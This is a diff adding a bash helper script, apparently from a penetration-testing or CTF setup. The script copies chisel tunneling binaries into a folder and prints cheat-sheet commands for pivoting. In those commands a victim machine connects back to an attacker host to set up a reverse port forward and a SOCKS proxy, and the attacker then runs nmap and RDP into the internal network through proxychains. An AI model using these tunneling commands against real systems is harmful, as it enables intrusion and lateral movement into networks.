@@ -1,0 +1,54 @@
+#!/usr/bin/bash
+
+# This script prepares tools and links for LFI exploitation
+
+dir="net/chisel"
+
+
+if [ "$1" = "-r" ]; then
+
+    if [[ -d $PWD/$dir ]]
+    then
+		rm -rf $PWD/$dir/*
+    fi
+    exit
+
+else
+
+	if [[ ! -d $PWD/$dir ]]
+	then
+		mkdir -p $dir
+	fi
+
+	if [[ -d $PWD/$dir ]]
+	then
+		cp /opt/$dir/* -r $dir
+		echo "Copying all tools...done"
+
+		echo ""
+		echo "  Port Forwarding" 
+		echo "  (Kali) ipchisel server -p 54321 --reverse"
+		echo "  (Victim) chisel client 10.10.14.4:54321 R:8001:localhost:8001" 
+		echo ""
+		echo "  Dynamic Port Forwarding"
+		echo "	(Kali) ./chisel_1.8.1_linux_amd64 server -p 5985 --reverse --socks5"
+		echo "	(Victim) ./chisel_1.8.1_linux(or Windows)_amd64 client <Kali IP>:5985 R:5000:socks"
+		echo "	(Kali) sudo vi /etc/proxychains.conf" 
+		echo "	(Kali) add "socks5 127.0.0.1 5000" # you set 5000 port for socks proxy in client"
+		echo "	(Kali) sudo proxychains4 nmap -Pn --top-ports=20 -sT 172.16.128.5" 
+		echo "	(Kali) proxychains xfreerdp /d:<domain name> /u:<user name> /v:<Victim IP> +clipboard" 
+		echo ""
+
+		pwd & ls $dir
+		chmod 755 $dir/*
+	
+    else
+		echo "No $dir directory exists"
+    fi
+  
+
+
+    
+fi
+
+
